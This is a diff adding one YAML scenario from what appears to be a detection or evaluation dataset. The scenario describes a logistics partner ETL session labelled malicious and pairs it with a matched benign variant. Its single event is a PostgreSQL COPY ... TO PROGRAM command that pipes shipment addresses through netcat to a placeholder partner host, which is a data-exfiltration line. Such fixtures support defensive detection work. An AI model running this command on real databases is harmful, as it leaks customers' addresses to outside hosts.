@@ -1,0 +1,30 @@
+scenario_id: gen_logistics_41_copy_to_program_mal_1046m
+family_id: gen_logistics_41_copy_to_program_fam_1046
+domain: logistics
+time_of_day: 01:50
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: exfil
+  role: partner_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 5.0
+  events:
+  - step_id: dump
+    sql: COPY (SELECT dest_address FROM shipments) TO PROGRAM 'nc sync.partner-mirror.example
+      443'
+    connects_to:
+      ip: 45.77.176.236
+      port: 8443
+matched_pair_id: gen_logistics_41_copy_to_program_pair_1046
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
